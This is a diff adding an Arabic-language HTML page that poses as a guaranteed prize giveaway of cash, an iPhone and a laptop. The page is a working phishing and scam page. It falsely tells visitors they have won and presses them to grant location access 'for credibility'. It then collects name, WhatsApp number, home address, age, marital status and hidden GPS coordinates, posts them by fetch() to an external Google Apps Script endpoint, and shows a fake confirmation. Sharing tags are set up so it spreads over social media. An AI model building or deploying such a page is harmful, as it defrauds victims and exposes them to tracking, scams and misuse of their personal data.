@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مهرجان الهدايا الكبرى - شارك واربح فورااً!</title>
+
+    <!-- Meta Tags for Social Sharing (WhatsApp, Facebook, Twitter, etc.) -->
+    <meta property="og:title" content="مهرجان الهدايا الكبرى - شارك واربح فورااً!">
+    <meta property="og:description" content="لقد تم اختيارك للمشاركة في سحب مضمون 100%! أكمل استبيان سريع واحصل فوراً على جائزتك.">
+    <!-- Note: For og:image to work perfectly on WhatsApp/Facebook, you might need to use the full URL (e.g. https://yourwebsite.com/Get $4,500_00 Cash Now!.jpg) -->
+    <meta property="og:image" content="Get $4,500_00 Cash Now!.jpg">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card Data -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="مهرجان الهدايا الكبرى - شارك واربح فورااً!">
+    <meta name="twitter:description" content="لقد تم اختيارك للمشاركة في سحب مضمون 100%! أكمل استبيان سريع واحصل فوراً على جائزتك.">
+    <meta name="twitter:image" content="Get $4,500_00 Cash Now!.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        /* --- الأساسيات --- */
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background: radial-gradient(circle, #1a1a2e 0%, #0f0f1b 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container { 
+            max-width: 450px; 
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            animation: fadeInContainer 1s ease-out;
+        }
+
+        @keyframes fadeInContainer {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 { 
+            color: #ffd700; 
+            font-weight: 900;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+        }
+        .highlight { color: #00e676; font-weight: bold; }
+        p { color: #b0b0b0; font-size: 1.1em; line-height: 1.6; }
+
+        /* --- معرض الجوائز المتحرك --- */
+        .prizes-carousel {
+            position: relative;
+            height: 220px;
+            margin: 30px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .prize-item {
+            position: absolute;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transition: all 0.5s ease-in-out;
+            transform: scale(0.8);
+        }
+
+        .prize-item.active {
+            opacity: 1;
+            transform: scale(1);
+            animation: float 3s ease-in-out infinite;
+        }
+
+        /* تنسيق الصور الحقيقية */
+        .prize-img {
+            width: 160px;
+            height: 160px;
+            object-fit: cover; /* عشان الصورة تملأ المربع بدون ما تتمط */
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
+            border: 3px solid #ffd700;
+            background-color: white; /* خلفية بيضاء عشان تبرز الصورة */
+            padding: 5px;
+        }
+
+        .prize-name {
+            margin-top: 15px;
+            font-weight: bold;
+            color: white;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 25px;
+            border: 1px solid #ffd700;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+        }
+
+        /* --- الأزرار --- */
+        .btn { 
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white; 
+            border: none; 
+            padding: 18px 30px; 
+            font-size: 20px; 
+            font-weight: bold;
+            border-radius: 50px; 
+            cursor: pointer; 
+            width: 100%; 
+            margin-top: 20px; 
+            transition: 0.3s; 
+            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .btn:hover { 
+            box-shadow: 0 8px 25px rgba(255, 75, 43, 0.6);
+            transform: translateY(-2px);
+        }
+
+        .pulse-btn {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 75, 43, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 75, 43, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 75, 43, 0); }
+        }
+
+        /* --- الفورم --- */
+        #survey-form { display: none; text-align: right; animation: fadeIn 0.5s; }
+        
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+
+        input, select { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 12px 0; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 10px; 
+            box-sizing: border-box; 
+            background: rgba(0,0,0,0.3);
+            color: white;
+            font-size: 1em;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ffd700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        option { background-color: #1a1a2e; color: white; }
+
+        /* --- رسالة النجاح --- */
+        #success-message { 
+            display: none; 
+            animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55); 
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-icon { font-size: 5em; margin-bottom: 20px; display: block; }
+        .loader { display: none; color: #ffd700; margin-top: 15px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="intro">
+        <h1>مبروووك! 🎉</h1>
+        <p>لقد تم اختيارك للمشاركة في سحب <span class="highlight">مضمون 100%</span>!</p>
+        <p>أكمل استبيان سريع واحصل فوراً على إحدى الجوائز التالية:</p>
+
+        <!-- معرض الجوائز مع الصور من الإنترنت -->
+        <div class="prizes-carousel">
+            <!-- جائزة 1 -->
+            <div class="prize-item active">
+                <img src=".//Get $4,500_00 Cash Now!.jpg" alt="10000 جنيه" class="prize-img">
+                <div class="prize-name">10,000 جنيه كاش</div>
+            </div>
+            <!-- جائزة 2 -->
+            <div class="prize-item">
+                <img src=".//iPhone 15 Plus.jpg" alt="ايفون 15 برو ماكس" class="prize-img">
+                <div class="prize-name">آيفون 15 برو ماكس</div>
+            </div>
+            <!-- جائزة 3 -->
+            <div class="prize-item">
+                <img src=".//Laptop Lenovo IdeaPad l340-15api, 15_6 _, 3 3200u, 4 GB, SSD 256 GB, Vega 3, fdos, Black.jpg" alt="لابتوب ديل" class="prize-img">
+                <div class="prize-name">لابتوب ديل G15</div>
+            </div>
+        </div>
+
+        <button class="btn pulse-btn" onclick="startSurvey()">هيا بنا لنربح! 🚀</button>
+    </div>
+
+    <form id="survey-form">
+        <h3 style="color: #ffd700; text-align:center;">أدخل بياناتك بدقة للشحن:</h3>
+        <input type="text" id="name" placeholder="الاسم بالكامل رباعي" required>
+        <input type="tel" id="phone" placeholder="رقم التليفون (واتساب)" required>
+        <input type="text" id="address" placeholder="العنوان بالتفصيل (النون)" required>
+        <input type="number" id="age" placeholder="السن" required min="18">
+        <select id="marital_status" required>
+            <option value="" disabled selected>الحالة الاجتماعية</option>
+            <option value="single">أعزب/عزباء</option>
+            <option value="married">متزوج/ة</option>
+        </select>
+        <input type="hidden" id="location_data">
+        <button type="submit" class="btn" id="submitBtn">تمت العملية ✅</button>
+        <div class="loader" id="loader">جاري تأكيد بياناتك وحجز الجائزة...</div>
+    </form>
+
+    <div id="success-message">
+        <span class="success-icon">🎁🎁🎁</span>
+        <h2 style="color: #00e676;">تهانينا الحارة! 🎉</h2>
+        <p>لقد تم تسجيلك في نظام الجوائز. سيتم التواصل معك عبر الهاتف خلال 24 ساعة لتأكيد شحن الجوائز التالية إليك:</p>
+        <p class="highlight">(10,000 جنيه، آيفون 15 برو ماكس، لابتوب ديل)</p>
+        <p style="font-size: 0.9em; color: #888;">برجاء إبقاء هاتفك متاحاً.</p>
+    </div>
+</div>
+
+<script>
+    // !!! لا تنسى وضع رابط Google Apps Script الخاص بك هنا !!!
+    const scriptURL = 'ضع_هنا_رابط_الـ_Web_App_الخاص_بـ_Google_Script'; 
+    const form = document.getElementById('survey-form');
+
+    let currentPrizeIndex = 0;
+    const prizes = document.querySelectorAll('.prize-item');
+
+    function rotatePrizes() {
+        prizes[currentPrizeIndex].classList.remove('active');
+        currentPrizeIndex = (currentPrizeIndex + 1) % prizes.length;
+        prizes[currentPrizeIndex].classList.add('active');
+    }
+
+    setInterval(rotatePrizes, 2500);
+
+    function startSurvey() {
+        alert("جاري تحديد أقرب مركز توزيع جوائز لك.. يرجى الموافقة على إذن الموقع للمصداقية.");
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    document.getElementById('location_data').value = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+                    showForm();
+                },
+                (error) => {
+                    document.getElementById('location_data').value = "Refused/Not Available";
+                    showForm(); 
+                }
+            );
+        } else {
+            showForm();
+        }
+    }
+
+    function showForm() {
+        document.getElementById('intro').style.display = 'none';
+        document.getElementById('survey-form').style.display = 'block';
+    }
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        document.getElementById('submitBtn').disabled = true;
+        document.getElementById('submitBtn').innerText = "جاري الحفظ...";
+        document.getElementById('loader').style.display = 'block';
+
+        const formData = new FormData();
+        formData.append('Name', document.getElementById('name').value);
+        formData.append('Phone', document.getElementById('phone').value);
+        formData.append('Address', document.getElementById('address').value);
+        formData.append('Age', document.getElementById('age').value);
+        formData.append('Status', document.getElementById('marital_status').value);
+        formData.append('Location', document.getElementById('location_data').value);
+
+        fetch(scriptURL, { method: 'POST', body: formData})
+            .then(response => {
+                document.getElementById('survey-form').style.display = 'none';
+                document.getElementById('success-message').style.display = 'block';
+                if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            })
+            .catch(error => {
+                console.error('Error!', error.message);
+                alert("عفواً، حدث خطأ في الشبكة. حاول مرة أخرى.");
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerText = "تمت العملية ✅";
+                document.getElementById('loader').style.display = 'none';
+            });
+    });
+</script>
+
+</body>
+</html>
